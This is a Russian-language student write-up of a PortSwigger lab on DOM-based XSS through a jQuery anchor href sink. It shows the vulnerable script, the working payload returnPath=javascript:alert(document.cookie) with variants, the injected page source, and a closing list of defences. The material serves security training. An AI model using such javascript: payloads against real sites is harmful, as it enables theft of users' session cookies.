
лаба https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink
#### DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
задание: 
на стр с комментами есть уязвимость xss dom
нужно сделать так чтобы при нажатии на кнопку назад - выходил аллерт с document.cookie

-------



есть страница фитбека
GET /feedback?returnPath=/ HTTP/2

в коде страницы есть интересная кнопка назад
```html
                       <div class="is-linkback">
                            <a id="backLink">Back</a>
                        </div>
                        <script>
                            $(function() {
                                $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
                            });
                        </script>
                    </form>
                    <script src="/resources/js/submitFeedback.js"></script>
```

здесь есть функция которая делает вот че
создает ссылку которая сработает при нажатии кнопки назад

функция берёт значение параметра `returnPath` из URL и вставляет его в атрибут `href`ссылки "Back"

вот сама ссылка
### `https://0aec003604498052825b1f93004d00c6.web-security-academy.net/feedback?returnPath=/post`

эта кнопка должна вести типо обратно на стр с которой я пришел?
но сама по себе кнопка не работает нихуя когда я перехожу со страницы поста на страницу для отзыва и пытаюсь поспасть обратно на стр откуда я пришел

но работает когда я перехожу из блога на стр отзыва и жму назад - попадаю на блог - работает

----

пробую 
`https://0aec003604498052825b1f93004d00c6.web-security-academy.net/feedback?returnPath=777`

и жму на кнопку назад
`https://0aec003604498052825b1f93004d00c6.web-security-academy.net/777`
ответ 404 NF
в коде страницы тоже ничего нет... 777 нет нигде кроме URL

но я вижу, что  returnPath= подставляется вот сюда 
```js
$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
```

факт того что 777 подставились вот сюда
`https://0aec003604498052825b1f93004d00c6.web-security-academy.net/777`
говорит о том, что мой пейлоад попадает в href

нужно туда передать пейлоад

## внутри URL = внутри <a href  -  код js   может выполнять только спец протокол  javascript:

обычный URL типа `https://site.com` — браузер идёт по адресу
НО `javascript:alert(1)` — браузер говорит "нахер сайт, выполняю код прямо здесь"

вот так можно это использовать

javascript:alert(document.cookie)
javascript:alert('XSS')
javascript:(function(){alert('XSS')})()


ориганал 
https://0aec003604498052825b1f93004d00c6.web-security-academy.net/feedback?returnPath=

меняю
https://0aec003604498052825b1f93004d00c6.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)

и вуаля! алерт выполнился!!!!!!!
⭐️ лаба решена!

----------

## как понял - что есть уязвимость?

#### увидел что подставляемые параметры в ссылку - оказываются в url  который выполняется при нажатии на кнопку, и увидел код JS который это все показал мне, что параметр из URL попадает  в href  

##### далее использовал протокол `javascript ` работающий внутри href и вызвал алерт с куками   (либо можно data использовать)
или ==data== - но data создаёт новую страницу (в той же вкладке) с HTML-кодом
Скрипт выполняется, но **в контексте новой страницы**, а не текущей

вот тут можно посмотреть как динамически сформировалась ссылка с тем параметром что введен в URL адрессную строку браузера

открываю код страницы
< a id="backLink" href="javascript:alert(document.cookie)">Back< /a>
```js
<form id="feedbackForm" action="/feedback/submit" method="POST" enctype="application/x-www-form-urlencoded">
                        <input required="" type="hidden" name="csrf" value="ch0DnCmQpZDzTJg82zYeiYszsm3Mg1I8">
                        <label>Name:</label>
                        <input required="" type="text" name="name">
                        <label>Email:</label>
                        <input required="" type="email" name="email">
                        <label>Subject:</label>
                        <input required="" type="text" name="subject">
                        <label>Message:</label>
                        <textarea required="" rows="12" cols="300" name="message"></textarea>
                        <button class="button" type="submit">
                            Submit feedback
                        </button>
                        <span id="feedbackResult"></span>
                        <script src="/resources/js/jquery_1-8-2.js"></script>
                        <div class="is-linkback">
                        
                        
                        
                            <a id="backLink" href="javascript:alert(document.cookie)">Back</a>
                            
                            
                            
                            
                        </div>
                        <script>
                            $(function() {
                                $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
                            });
                        </script>
                    </form>
```

--------



## как защититься от атак через javascript в href

никогда не вставлять пользовательские данные в атрибут href без валидации - это главное правило

использовать белый список разрешённых протоколов - разрешать только http и https, всё остальное нахуй

проверять что значение начинается с разрешённого протокола и не содержит javascript: или data:

если нужно вставить путь относительно сайта - создавать его самому на сервере а не брать из URL

использовать safe methods типа setAttribute с проверками или создавать ссылки через DOM-методы с валидацией

применять Content Security Policy с директивой restrict-тоесть чтобы запретить javascript: в href

экранировать и кодировать спецсимволы перед вставкой в атрибуты

не доверять данным из location.search document.referrer и других источников которые может контролировать юзер

использовать современные фреймворки которые по умолчанию экранируют вывод и не позволяют такую хуйню